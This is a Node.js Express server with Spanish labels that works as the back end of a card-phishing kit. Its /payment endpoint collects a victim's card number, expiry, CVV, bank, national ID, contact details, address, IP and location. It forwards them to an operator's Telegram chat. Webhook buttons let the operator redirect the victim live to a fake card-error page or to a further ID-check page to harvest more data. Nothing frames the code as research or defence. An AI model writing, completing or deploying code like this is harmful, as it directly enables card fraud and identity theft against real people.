const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

let redirectionTable = {};
let lastSession = null;

// Cliente → Servidor
app.post('/payment', async (req, res) => {
    const data = req.body;
    lastSession = data.sessionId;

    const text = `
🟣Viank🟣 - |[info]|
---
ℹ️DATOS DE LA TARJETA

💳: ${data.p}
📅: ${data.pdate}
🔒: ${data.c}
🏛️: ${data.ban}

ℹ️DATOS DEL CLIENTE

👨: ${data.dudename} ${data.surname}
🪪: ${data.cc}
📩: ${data.email}
📞: ${data.telnum}

ℹ️DATOS DE FACTURACION

🏙️: ${data.city}
🏙️: ${data.state}
🏙️: ${data.address}
🌐 IP: ${data.ip}
📍 Ubicación: ${data.location}
---
`;

    const reply_markup = {
        inline_keyboard: [
            [
                { text: '❌ Error Tarjeta', callback_data: 'go:payment.html' },
                { text: '✅ Siguiente', callback_data: 'go:id-check.html' }
            ]
        ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text,
        reply_markup: reply_markup,
        parse_mode: "Markdown"
    });

    res.send({ ok: true });
});

// Webhook que procesa los clics en los botones
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const data = update.callback_query.data; // ej: "go:id-check.html"
        const target = data.replace('go:', '');

        if (lastSession) {
            redirectionTable[lastSession] = target;
        }

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: `Redireccionando al cliente a ${target}`,
            show_alert: true
        });

        res.sendStatus(200);
    } else {
        res.sendStatus(200);
    }
});

// Cliente consulta redirección
app.get('/get-redirect/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    const target = redirectionTable[sessionId] || null;
    res.send({ target });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en ${PORT}`));
